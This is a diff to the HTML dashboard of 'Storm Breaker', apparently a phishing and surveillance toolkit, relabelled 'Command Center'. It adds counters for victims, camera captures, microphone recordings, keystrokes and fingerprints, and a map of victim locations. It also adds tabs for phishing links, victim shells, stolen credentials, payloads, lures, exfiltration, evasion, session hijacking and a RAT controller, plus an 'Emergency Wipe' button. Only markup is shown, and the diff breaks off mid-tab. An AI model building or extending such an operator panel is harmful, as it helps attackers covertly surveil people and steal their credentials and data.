@@ -4,13 +4,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Storm Breaker | Dashboard</title>
+    <title>Storm Breaker | Command Center</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link
         href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap"
         rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
+    <!-- Chart.js for analytics -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
+    <!-- Leaflet for world map -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script>
         tailwind.config = {
             darkMode: 'class',
@@ -33,34 +38,55 @@
     </script>
     <style>
         /* Custom Scrollbar */
-        ::-webkit-scrollbar {
-            width: 8px;
-            height: 8px;
-        }
-
-        ::-webkit-scrollbar-track {
-            background: #0f172a;
-        }
-
-        ::-webkit-scrollbar-thumb {
-            background: #334155;
-            border-radius: 4px;
-        }
-
-        ::-webkit-scrollbar-thumb:hover {
-            background: #475569;
-        }
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: #0f172a; }
+        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #475569; }
 
         .glass-panel {
             background: rgba(30, 41, 59, 0.7);
-            backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
-            border: 1px solid rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.06);
         }
 
         .premium-shadow {
-            box-shadow: 0 0 0 1px rgba(255, 255, 255, 0.05), 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            box-shadow: 0 0 0 1px rgba(255,255,255,0.05), 0 8px 32px -8px rgba(0,0,0,0.3);
         }
+
+        .neon-glow-blue { box-shadow: 0 0 20px rgba(59,130,246,0.15), 0 0 40px rgba(59,130,246,0.05); }
+        .neon-glow-red { box-shadow: 0 0 20px rgba(239,68,68,0.15), 0 0 40px rgba(239,68,68,0.05); }
+        .neon-glow-green { box-shadow: 0 0 20px rgba(16,185,129,0.15), 0 0 40px rgba(16,185,129,0.05); }
+        .neon-glow-purple { box-shadow: 0 0 20px rgba(168,85,247,0.15), 0 0 40px rgba(168,85,247,0.05); }
+
+        .stat-card { transition: all 0.3s cubic-bezier(0.4,0,0.2,1); }
+        .stat-card:hover { transform: translateY(-2px); }
+
+        @keyframes pulse-ring {
+            0% { transform: scale(0.8); opacity: 1; }
+            100% { transform: scale(2); opacity: 0; }
+        }
+        .pulse-ring { animation: pulse-ring 1.5s cubic-bezier(0.215,0.61,0.355,1) infinite; }
+
+        @keyframes count-up { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .count-animate { animation: count-up 0.4s ease-out; }
+
+        .tab-badge {
+            font-size: 10px;
+            min-width: 18px;
+            height: 18px;
+            line-height: 18px;
+            padding: 0 5px;
+        }
+
+        /* Leaflet map dark mode */
+        .leaflet-container { background: #0f172a !important; }
+        .leaflet-tile { filter: brightness(0.6) invert(1) contrast(3) hue-rotate(200deg) saturate(0.3) brightness(0.7); }
+        .leaflet-control-zoom a { background: #1e293b !important; color: #94a3b8 !important; border-color: #334155 !important; }
+
+        /* Terminal cursor blink */
+        @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0; } }
+        .cursor-blink::after { content: '▋'; animation: blink 1s step-end infinite; color: #3b82f6; }
     </style>
 </head>
 
@@ -72,38 +98,90 @@
         <div class="h-16 flex items-center px-6 border-b border-slate-800">
             <div class="flex items-center space-x-3">
                 <div
-                    class="w-8 h-8 rounded-lg bg-gradient-to-br from-blue-500 to-purple-600 flex items-center justify-center shadow-lg shadow-blue-500/20">
+                    class="w-9 h-9 rounded-xl bg-gradient-to-br from-blue-500 via-purple-500 to-pink-500 flex items-center justify-center shadow-lg shadow-blue-500/30 animate__animated animate__pulse animate__infinite animate__slower">
                     <i class="fas fa-bolt text-white text-sm"></i>
                 </div>
-                <span
-                    class="text-xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-white to-slate-400">Storm
-                    Breaker</span>
+                <div>
+                    <span class="text-lg font-bold bg-clip-text text-transparent bg-gradient-to-r from-blue-400 via-purple-400 to-pink-400">Storm Breaker</span>
+                    <div class="text-[10px] text-slate-600 font-mono -mt-1">v4.0 COMMAND CENTER</div>
+                </div>
             </div>
         </div>
 
-        <nav class="flex-1 overflow-y-auto py-6 px-4 space-y-1">
-            <a href="#"
-                class="nav-link active flex items-center space-x-3 px-4 py-3 rounded-xl bg-blue-600/10 text-blue-400 border border-blue-600/10 transition-all group">
-                <i class="fas fa-grid-2 w-5 text-center group-hover:scale-110 transition-transform"></i>
-                <span class="font-medium">Dashboard</span>
+        <!-- Live Status Indicator -->
+        <div class="px-4 py-3 border-b border-slate-800">
+            <div class="flex items-center justify-between">
+                <div class="flex items-center space-x-2">
+                    <span class="relative flex h-2.5 w-2.5">
+                        <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
+                        <span class="relative inline-flex rounded-full h-2.5 w-2.5 bg-emerald-500"></span>
+                    </span>
+                    <span class="text-xs text-emerald-400 font-medium">SYSTEM ACTIVE</span>
+                </div>
+                <span id="sidebar-uptime" class="text-[10px] text-slate-500 font-mono">00:00:00</span>
+            </div>
+            <div class="mt-2 grid grid-cols-3 gap-2 text-center">
+                <div class="bg-slate-800/50 rounded-lg py-1.5">
+                    <div id="sidebar-victims" class="text-sm font-bold text-blue-400">0</div>
+                    <div class="text-[9px] text-slate-500 uppercase">Victims</div>
+                </div>
+                <div class="bg-slate-800/50 rounded-lg py-1.5">
+                    <div id="sidebar-captures" class="text-sm font-bold text-purple-400">0</div>
+                    <div class="text-[9px] text-slate-500 uppercase">Captures</div>
+                </div>
+                <div class="bg-slate-800/50 rounded-lg py-1.5">
+                    <div id="sidebar-alerts" class="text-sm font-bold text-red-400">0</div>
+                    <div class="text-[9px] text-slate-500 uppercase">Alerts</div>
+                </div>
+            </div>
+        </div>
+
+        <nav class="flex-1 overflow-y-auto py-4 px-3 space-y-1">
+            <div class="text-[10px] text-slate-600 font-bold uppercase tracking-wider px-3 mb-2">Navigation</div>
+            <a href="#" data-sidebar-tab="dashboard"
+                class="nav-link active flex items-center space-x-3 px-4 py-2.5 rounded-xl bg-blue-600/10 text-blue-400 border border-blue-600/10 transition-all group">
+                <i class="fas fa-gauge-high w-5 text-center group-hover:scale-110 transition-transform"></i>
+                <span class="font-medium text-sm">Dashboard</span>
             </a>
-            <a href="#"
-                class="nav-link flex items-center space-x-3 px-4 py-3 rounded-xl text-slate-400 hover:bg-slate-800 hover:text-white transition-all group">
+            <a href="#" data-sidebar-tab="analytics"
+                class="nav-link flex items-center space-x-3 px-4 py-2.5 rounded-xl text-slate-400 hover:bg-slate-800 hover:text-white transition-all group">
+                <i class="fas fa-chart-line w-5 text-center group-hover:scale-110 transition-transform"></i>
+                <span class="font-medium text-sm">Analytics</span>
+            </a>
+            <a href="#" data-sidebar-tab="alerts"
+                class="nav-link flex items-center space-x-3 px-4 py-2.5 rounded-xl text-slate-400 hover:bg-slate-800 hover:text-white transition-all group">
+                <i class="fas fa-bell w-5 text-center group-hover:scale-110 transition-transform"></i>
+                <span class="font-medium text-sm">Alerts</span>
+                <span id="nav-alert-badge" class="ml-auto px-1.5 py-0.5 text-[9px] bg-red-500 text-white rounded-full hidden">0</span>
+            </a>
+            
+            <div class="text-[10px] text-slate-600 font-bold uppercase tracking-wider px-3 mb-2 mt-4">Tools</div>
+            <a href="#" data-sidebar-tab="terminal"
+                class="nav-link flex items-center space-x-3 px-4 py-2.5 rounded-xl text-slate-400 hover:bg-slate-800 hover:text-white transition-all group">
                 <i class="fas fa-terminal w-5 text-center group-hover:scale-110 transition-transform"></i>
-                <span class="font-medium">Logs</span>
+                <span class="font-medium text-sm">Terminal</span>
             </a>
-            <a href="#"
-                class="nav-link flex items-center space-x-3 px-4 py-3 rounded-xl text-slate-400 hover:bg-slate-800 hover:text-white transition-all group">
+            <a href="#" data-sidebar-tab="settings"
+                class="nav-link flex items-center space-x-3 px-4 py-2.5 rounded-xl text-slate-400 hover:bg-slate-800 hover:text-white transition-all group">
                 <i class="fas fa-cog w-5 text-center group-hover:scale-110 transition-transform"></i>
-                <span class="font-medium">Settings</span>
+                <span class="font-medium text-sm">Settings</span>
             </a>
         </nav>
 
-        <div class="p-4 border-t border-slate-800">
+        <!-- Quick Actions -->
+        <div class="p-3 border-t border-slate-800 space-y-2">
+            <button onclick="exportAllData()" class="w-full flex items-center space-x-3 px-4 py-2 rounded-xl text-slate-400 hover:bg-emerald-500/10 hover:text-emerald-400 transition-all group text-sm">
+                <i class="fas fa-file-archive w-5 text-center"></i>
+                <span>Export All Data</span>
+            </button>
+            <button onclick="nukeData()" class="w-full flex items-center space-x-3 px-4 py-2 rounded-xl text-slate-400 hover:bg-red-500/10 hover:text-red-400 transition-all group text-sm">
+                <i class="fas fa-radiation w-5 text-center"></i>
+                <span>Emergency Wipe</span>
+            </button>
             <a href="{{ url_for('logout') }}"
-                class="flex items-center space-x-3 px-4 py-3 rounded-xl text-red-400 hover:bg-red-500/10 hover:text-red-300 transition-all group">
+                class="flex items-center space-x-3 px-4 py-2 rounded-xl text-red-400 hover:bg-red-500/10 hover:text-red-300 transition-all group">
                 <i class="fas fa-sign-out-alt w-5 text-center group-hover:-translate-x-1 transition-transform"></i>
-                <span class="font-medium">Logout</span>
+                <span class="font-medium text-sm">Logout</span>
             </a>
         </div>
     </aside>
@@ -143,91 +221,310 @@
             <div class="max-w-7xl mx-auto space-y-8">
 
                 <!-- Stats Grid -->
-                <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
-                    <div class="glass-panel p-6 rounded-2xl premium-shadow relative overflow-hidden group">
-                        <div class="absolute top-0 right-0 p-4 opacity-10 group-hover:opacity-20 transition-opacity">
-                            <i class="fas fa-wifi text-6xl text-emerald-500"></i>
+                <div class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-4">
+                    <div class="stat-card glass-panel p-4 rounded-2xl premium-shadow neon-glow-green relative overflow-hidden group">
+                        <div class="absolute top-0 right-0 p-3 opacity-10 group-hover:opacity-20 transition-opacity">
+                            <i class="fas fa-users text-4xl text-emerald-500"></i>
                         </div>
                         <div class="relative z-10">
-                            <div class="text-slate-400 text-sm font-medium mb-1">System Status</div>
-                            <div class="text-2xl font-bold text-emerald-400 flex items-center space-x-2">
-                                <span class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
-                                <span>Active</span>
+                            <div class="text-slate-500 text-[10px] font-bold uppercase tracking-wider">Active Victims</div>
+                            <div id="stat-victims" class="text-3xl font-bold text-emerald-400 mt-1 font-mono count-animate">0</div>
+                            <div class="flex items-center mt-1">
+                                <span class="relative flex h-2 w-2 mr-1.5"><span class="animate-ping absolute h-full w-full rounded-full bg-emerald-400 opacity-75"></span><span class="relative rounded-full h-2 w-2 bg-emerald-500"></span></span>
+                                <span id="stat-victims-detail" class="text-[10px] text-slate-500">0 C2 / 0 Mobile</span>
                             </div>
                         </div>
                     </div>
 
-                    <div class="glass-panel p-6 rounded-2xl premium-shadow relative overflow-hidden group">
-                        <div class="absolute top-0 right-0 p-4 opacity-10 group-hover:opacity-20 transition-opacity">
-                            <i class="fas fa-network-wired text-6xl text-blue-500"></i>
+                    <div class="stat-card glass-panel p-4 rounded-2xl premium-shadow neon-glow-purple relative overflow-hidden group">
+                        <div class="absolute top-0 right-0 p-3 opacity-10 group-hover:opacity-20 transition-opacity">
+                            <i class="fas fa-camera text-4xl text-purple-500"></i>
                         </div>
                         <div class="relative z-10">
-                            <div class="text-slate-400 text-sm font-medium mb-1">Port</div>
-                            <div class="text-2xl font-bold text-white font-mono">2525</div>
+                            <div class="text-slate-500 text-[10px] font-bold uppercase tracking-wider">Images</div>
+                            <div id="stat-images" class="text-3xl font-bold text-purple-400 mt-1 font-mono count-animate">0</div>
+                            <div class="text-[10px] text-slate-500 mt-1">Camera captures</div>
                         </div>
                     </div>
 
-                    <div class="glass-panel p-6 rounded-2xl premium-shadow relative overflow-hidden group">
-                        <div class="absolute top-0 right-0 p-4 opacity-10 group-hover:opacity-20 transition-opacity">
-                            <i class="fas fa-fingerprint text-6xl text-purple-500"></i>
+                    <div class="stat-card glass-panel p-4 rounded-2xl premium-shadow relative overflow-hidden group">
+                        <div class="absolute top-0 right-0 p-3 opacity-10 group-hover:opacity-20 transition-opacity">
+                            <i class="fas fa-microphone text-4xl text-pink-500"></i>
                         </div>
                         <div class="relative z-10">
-                            <div class="text-slate-400 text-sm font-medium mb-1">Session ID</div>
-                            <div class="text-2xl font-bold text-purple-400 font-mono">#8X92</div>
+                            <div class="text-slate-500 text-[10px] font-bold uppercase tracking-wider">Audio</div>
+                            <div id="stat-audio" class="text-3xl font-bold text-pink-400 mt-1 font-mono count-animate">0</div>
+                            <div class="text-[10px] text-slate-500 mt-1">Mic recordings</div>
+                        </div>
+                    </div>
+
+                    <div class="stat-card glass-panel p-4 rounded-2xl premium-shadow neon-glow-blue relative overflow-hidden group">
+                        <div class="absolute top-0 right-0 p-3 opacity-10 group-hover:opacity-20 transition-opacity">
+                            <i class="fas fa-fingerprint text-4xl text-blue-500"></i>
+                        </div>
+                        <div class="relative z-10">
+                            <div class="text-slate-500 text-[10px] font-bold uppercase tracking-wider">Fingerprints</div>
+                            <div id="stat-fingerprints" class="text-3xl font-bold text-blue-400 mt-1 font-mono count-animate">0</div>
+                            <div class="text-[10px] text-slate-500 mt-1">Device profiles</div>
+                        </div>
+                    </div>
+
+                    <div class="stat-card glass-panel p-4 rounded-2xl premium-shadow neon-glow-red relative overflow-hidden group">
+                        <div class="absolute top-0 right-0 p-3 opacity-10 group-hover:opacity-20 transition-opacity">
+                            <i class="fas fa-keyboard text-4xl text-red-500"></i>
+                        </div>
+                        <div class="relative z-10">
+                            <div class="text-slate-500 text-[10px] font-bold uppercase tracking-wider">Keystrokes</div>
+                            <div id="stat-keystrokes" class="text-3xl font-bold text-red-400 mt-1 font-mono count-animate">0</div>
+                            <div class="text-[10px] text-slate-500 mt-1">Key captures</div>
+                        </div>
+                    </div>
+
+                    <div class="stat-card glass-panel p-4 rounded-2xl premium-shadow relative overflow-hidden group">
+                        <div class="absolute top-0 right-0 p-3 opacity-10 group-hover:opacity-20 transition-opacity">
+                            <i class="fas fa-server text-4xl text-cyan-500"></i>
+                        </div>
+                        <div class="relative z-10">
+                            <div class="text-slate-500 text-[10px] font-bold uppercase tracking-wider">System</div>
+                            <div id="stat-cpu" class="text-3xl font-bold text-cyan-400 mt-1 font-mono count-animate">0%</div>
+                            <div id="stat-memory" class="text-[10px] text-slate-500 mt-1">RAM: 0%</div>
                         </div>
                     </div>
                 </div>
 
+                <!-- Activity Chart + World Map Row -->
+                <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                    <!-- Activity Chart -->
+                    <div class="glass-panel rounded-2xl premium-shadow p-5">
+                        <div class="flex items-center justify-between mb-4">
+                            <h3 class="text-sm font-bold text-white flex items-center space-x-2">
+                                <i class="fas fa-chart-area text-blue-400"></i>
+                                <span>Activity Timeline</span>
+                            </h3>
+                            <select id="chart-timeframe" class="text-xs bg-slate-800 border border-slate-700 rounded px-2 py-1 text-slate-400" onchange="updateActivityChart()">
+                                <option value="24">24 Hours</option>
+                                <option value="12">12 Hours</option>
+                                <option value="6">6 Hours</option>
+                            </select>
+                        </div>
+                        <div style="height: 200px;">
+                            <canvas id="activity-chart"></canvas>
+                        </div>
+                    </div>
+
+                    <!-- World Map -->
+                    <div class="glass-panel rounded-2xl premium-shadow p-5">
+                        <div class="flex items-center justify-between mb-4">
+                            <h3 class="text-sm font-bold text-white flex items-center space-x-2">
+                                <i class="fas fa-globe text-emerald-400"></i>
+                                <span>Victim Locations</span>
+                            </h3>
+                            <span id="map-victim-count" class="text-xs text-slate-500">0 locations tracked</span>
+                        </div>
+                        <div id="world-map" style="height: 200px; border-radius: 12px; overflow: hidden;"></div>
+                    </div>
+                </div>
+
+                <!-- Recent Events Feed -->
+                <div class="glass-panel rounded-2xl premium-shadow p-5">
+                    <div class="flex items-center justify-between mb-3">
+                        <h3 class="text-sm font-bold text-white flex items-center space-x-2">
+                            <i class="fas fa-bolt text-yellow-400"></i>
+                            <span>Live Event Feed</span>
+                        </h3>
+                        <div class="flex items-center space-x-2">
+                            <span class="relative flex h-2 w-2"><span class="animate-ping absolute h-full w-full rounded-full bg-yellow-400 opacity-75"></span><span class="relative rounded-full h-2 w-2 bg-yellow-500"></span></span>
+                            <span class="text-[10px] text-yellow-400">LIVE</span>
+                        </div>
+                    </div>
+                    <div id="live-event-feed" class="space-y-1 max-h-[120px] overflow-y-auto">
+                        <div class="text-xs text-slate-600 py-2">Waiting for events...</div>
+                    </div>
+                </div>
+
                 <!-- Tabs Navigation -->
-                <div class="border-b border-slate-800">
-                    <nav class="flex space-x-8" aria-label="Tabs">
+                <div class="border-b border-slate-800 overflow-x-auto">
+                    <nav class="flex space-x-1 min-w-max" aria-label="Tabs">
                         <button
-                            class="tab-btn active group inline-flex items-center py-4 px-1 border-b-2 border-blue-500 font-medium text-sm text-blue-400"
+                            class="tab-btn active group inline-flex items-center py-3 px-3 border-b-2 border-blue-500 font-medium text-xs text-blue-400 transition-all whitespace-nowrap"
                             data-tab="links">
-                            <i class="fas fa-link mr-2 group-hover:text-blue-400"></i>
+                            <i class="fas fa-link mr-1.5"></i>
                             <span>Phishing Links</span>
                         </button>
                         <button
-                            class="tab-btn group inline-flex items-center py-4 px-1 border-b-2 border-transparent font-medium text-sm text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all"
+                            class="tab-btn group inline-flex items-center py-3 px-3 border-b-2 border-transparent font-medium text-xs text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all whitespace-nowrap"
                             data-tab="images">
-                            <i class="fas fa-images mr-2 group-hover:text-slate-200"></i>
+                            <i class="fas fa-images mr-1.5"></i>
                             <span>Images</span>
+                            <span id="badge-images" class="tab-badge ml-1.5 bg-purple-500/20 text-purple-400 rounded-full hidden">0</span>
                         </button>
                         <button
-                            class="tab-btn group inline-flex items-center py-4 px-1 border-b-2 border-transparent font-medium text-sm text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all"
+                            class="tab-btn group inline-flex items-center py-3 px-3 border-b-2 border-transparent font-medium text-xs text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all whitespace-nowrap"
                             data-tab="audio">
-                            <i class="fas fa-microphone mr-2 group-hover:text-slate-200"></i>
+                            <i class="fas fa-microphone mr-1.5"></i>
                             <span>Audio</span>
+                            <span id="badge-audio" class="tab-badge ml-1.5 bg-pink-500/20 text-pink-400 rounded-full hidden">0</span>
                         </button>
                         <button
-                            class="tab-btn group inline-flex items-center py-4 px-1 border-b-2 border-transparent font-medium text-sm text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all"
+                            class="tab-btn group inline-flex items-center py-3 px-3 border-b-2 border-transparent font-medium text-xs text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all whitespace-nowrap"
                             data-tab="logs">
-                            <i class="fas fa-stream mr-2 group-hover:text-slate-200"></i>
+                            <i class="fas fa-stream mr-1.5"></i>
                             <span>Live Traffic</span>
+                            <span class="relative flex h-2 w-2 ml-1.5"><span class="animate-ping absolute h-full w-full rounded-full bg-emerald-400 opacity-75"></span><span class="relative rounded-full h-2 w-2 bg-emerald-500"></span></span>
                         </button>
                         <button
-                            class="tab-btn group inline-flex items-center py-4 px-1 border-b-2 border-transparent font-medium text-sm text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all"
+                            class="tab-btn group inline-flex items-center py-3 px-3 border-b-2 border-transparent font-medium text-xs text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all whitespace-nowrap"
                             data-tab="terminal">
-                            <i class="fas fa-terminal mr-2 group-hover:text-slate-200"></i>
+                            <i class="fas fa-terminal mr-1.5"></i>
                             <span>Terminal</span>
                         </button>
                         <button
-                            class="tab-btn group inline-flex items-center py-4 px-1 border-b-2 border-transparent font-medium text-sm text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all"
+                            class="tab-btn group inline-flex items-center py-3 px-3 border-b-2 border-transparent font-medium text-xs text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all whitespace-nowrap"
                             data-tab="c2">
-                            <i class="fas fa-network-wired mr-2 group-hover:text-slate-200"></i>
+                            <i class="fas fa-network-wired mr-1.5"></i>
                             <span>Victim Shells</span>
+                            <span id="badge-c2" class="tab-badge ml-1.5 bg-emerald-500/20 text-emerald-400 rounded-full hidden">0</span>
                         </button>
                         <button
-                            class="tab-btn group inline-flex items-center py-4 px-1 border-b-2 border-transparent font-medium text-sm text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all"
+                            class="tab-btn group inline-flex items-center py-3 px-3 border-b-2 border-transparent font-medium text-xs text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all whitespace-nowrap"
                             data-tab="files">
-                            <i class="fas fa-folder-open mr-2 group-hover:text-slate-200"></i>
+                            <i class="fas fa-folder-open mr-1.5"></i>
                             <span>File Manager</span>
                         </button>
                         <button
-                            class="tab-btn group inline-flex items-center py-4 px-1 border-b-2 border-transparent font-medium text-sm text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all"
+                            class="tab-btn group inline-flex items-center py-3 px-3 border-b-2 border-transparent font-medium text-xs text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all whitespace-nowrap"
                             data-tab="mobile">
-                            <i class="fas fa-mobile-alt mr-2 group-hover:text-slate-200"></i>
-                            <span>Mobile Devices</span>
+                            <i class="fas fa-mobile-alt mr-1.5"></i>
+                            <span>Mobile</span>
+                            <span id="badge-mobile" class="tab-badge ml-1.5 bg-blue-500/20 text-blue-400 rounded-full hidden">0</span>
+                        </button>
+                        <button
+                            class="tab-btn group inline-flex items-center py-3 px-3 border-b-2 border-transparent font-medium text-xs text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all whitespace-nowrap"
+                            data-tab="analytics">
+                            <i class="fas fa-chart-pie mr-1.5"></i>
+                            <span>Analytics</span>
+                        </button>
+                        <button
+                            class="tab-btn group inline-flex items-center py-3 px-3 border-b-2 border-transparent font-medium text-xs text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all whitespace-nowrap"
+                            data-tab="intel">
+                            <i class="fas fa-shield-alt mr-1.5"></i>
+                            <span>Intel</span>
+                        </button>
+                        <button
+                            class="tab-btn group inline-flex items-center py-3 px-3 border-b-2 border-transparent font-medium text-xs text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all whitespace-nowrap"
+                            data-tab="credentials">
+                            <i class="fas fa-key mr-1.5 text-red-400"></i>
+                            <span>Credentials</span>
+                            <span id="badge-creds" class="tab-badge ml-1.5 bg-red-500/20 text-red-400 rounded-full hidden">0</span>
+                        </button>
+                        <button
+                            class="tab-btn group inline-flex items-center py-3 px-3 border-b-2 border-transparent font-medium text-xs text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all whitespace-nowrap"
+                            data-tab="payloads">
+                            <i class="fas fa-crosshairs mr-1.5 text-cyan-400"></i>
+                            <span>Payloads</span>
+                        </button>
+                        <button
+                            class="tab-btn group inline-flex items-center py-3 px-3 border-b-2 border-transparent font-medium text-xs text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all whitespace-nowrap"
+                            data-tab="campaigns">
+                            <i class="fas fa-bullhorn mr-1.5 text-orange-400"></i>
+                            <span>Campaigns</span>
+                        </button>
+                        <button
+                            class="tab-btn group inline-flex items-center py-3 px-3 border-b-2 border-transparent font-medium text-xs text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all whitespace-nowrap"
+                            data-tab="profiles"
+                            onclick="VictimProfiler.init()">
+                            <i class="fas fa-user-secret mr-1.5 text-purple-400"></i>
+                            <span>Profiles</span>
+                        </button>
+                        <button
+                            class="tab-btn group inline-flex items-center py-3 px-3 border-b-2 border-transparent font-medium text-xs text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all whitespace-nowrap"
+                            data-tab="obfuscation">
+                            <i class="fas fa-mask mr-1.5 text-pink-400"></i>
+                            <span>Obfuscation</span>
+                        </button>
+                        <button
+                            class="tab-btn group inline-flex items-center py-3 px-3 border-b-2 border-transparent font-medium text-xs text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all whitespace-nowrap"
+                            data-tab="reports">
+                            <i class="fas fa-file-alt mr-1.5 text-indigo-400"></i>
+                            <span>Reports</span>
+                        </button>
+                        <button
+                            class="tab-btn group inline-flex items-center py-3 px-3 border-b-2 border-transparent font-medium text-xs text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all whitespace-nowrap"
+                            data-tab="lures">
+                            <i class="fas fa-envelope-open-text mr-1.5 text-emerald-400"></i>
+                            <span>Lures</span>
+                        </button>
+                        <button
+                            class="tab-btn group inline-flex items-center py-3 px-3 border-b-2 border-transparent font-medium text-xs text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all whitespace-nowrap"
+                            data-tab="exfil">
+                            <i class="fas fa-database mr-1.5 text-amber-400"></i>
+                            <span>Exfiltration</span>
+                        </button>
+                        <button
+                            class="tab-btn group inline-flex items-center py-3 px-3 border-b-2 border-transparent font-medium text-xs text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all whitespace-nowrap"
+                            data-tab="network">
+                            <i class="fas fa-network-wired mr-1.5 text-teal-400"></i>
+                            <span>Network</span>
+                        </button>
+                        <button
+                            class="tab-btn group inline-flex items-center py-3 px-3 border-b-2 border-transparent font-medium text-xs text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all whitespace-nowrap"
+                            data-tab="playbooks">
+                            <i class="fas fa-book mr-1.5 text-rose-400"></i>
+                            <span>Playbooks</span>
+                        </button>
+                        <button
+                            class="tab-btn group inline-flex items-center py-3 px-3 border-b-2 border-transparent font-medium text-xs text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all whitespace-nowrap"
+                            data-tab="evasion">
+                            <i class="fas fa-ghost mr-1.5 text-violet-400"></i>
+                            <span>Evasion</span>
+                        </button>
+                        <button
+                            class="tab-btn group inline-flex items-center py-3 px-3 border-b-2 border-transparent font-medium text-xs text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all whitespace-nowrap"
+                            data-tab="threat-intel">
+                            <i class="fas fa-shield-alt mr-1.5 text-cyan-400"></i>
+                            <span>Threat Intel</span>
+                        </button>
+                        <button
+                            class="tab-btn group inline-flex items-center py-3 px-3 border-b-2 border-transparent font-medium text-xs text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all whitespace-nowrap"
+                            data-tab="session-hijack">
+                            <i class="fas fa-user-secret mr-1.5 text-indigo-400"></i>
+                            <span>Session Hijack</span>
+                        </button>
+                        <button
+                            class="tab-btn group inline-flex items-center py-3 px-3 border-b-2 border-transparent font-medium text-xs text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all whitespace-nowrap"
+                            data-tab="pivot">
+                            <i class="fas fa-project-diagram mr-1.5 text-sky-400"></i>
+                            <span>Pivot Engine</span>
+                        </button>
+                        <button
+                            class="tab-btn group inline-flex items-center py-3 px-3 border-b-2 border-transparent font-medium text-xs text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all whitespace-nowrap"
+                            data-tab="rat">
+                            <i class="fas fa-skull-crossbones mr-1.5 text-red-400"></i>
+                            <span>RAT Controller</span>
+                        </button>
+                        <button
+                            class="tab-btn group inline-flex items-center py-3 px-3 border-b-2 border-transparent font-medium text-xs text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all whitespace-nowrap"
+                            data-tab="ai-threat">
+                            <i class="fas fa-brain mr-1.5 text-violet-400"></i>
+                            <span>AI Threat</span>
+                        </button>
+                        <button
+                            class="tab-btn group inline-flex items-center py-3 px-3 border-b-2 border-transparent font-medium text-xs text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all whitespace-nowrap"
+                            data-tab="zeroday">
+                            <i class="fas fa-bug mr-1.5 text-red-500"></i>
+                            <span>Zero-Day Lab</span>
+                        </button>
+                        <button
+                            class="tab-btn group inline-flex items-center py-3 px-3 border-b-2 border-transparent font-medium text-xs text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all whitespace-nowrap"
+                            data-tab="quantum">
+                            <i class="fas fa-atom mr-1.5 text-cyan-400"></i>
+                            <span>Quantum Crypto</span>
+                        </button>
+                        <button
+                            class="tab-btn group inline-flex items-center py-3 px-3 border-b-2 border-transparent font-medium text-xs text-slate-400 hover:text-slate-200 hover:border-slate-700 transition-all whitespace-nowrap"
+                            data-tab="deeprecon">
+                            <i class="fas fa-globe mr-1.5 text-emerald-400"></i>
+                            <span>Deep Recon</span>
                         </button>
                     </nav>
                 </div>
@@ -708,10 +1005,1077 @@
                         </div>
                     </div>
 
+                    <!-- ===== ANALYTICS TAB ===== -->
+                    <div id="tab-analytics" class="tab-content hidden space-y-6 animate__animated animate__fadeIn">
+                        <div class="flex items-center justify-between bg-slate-900/50 p-4 rounded-xl border border-slate-800">
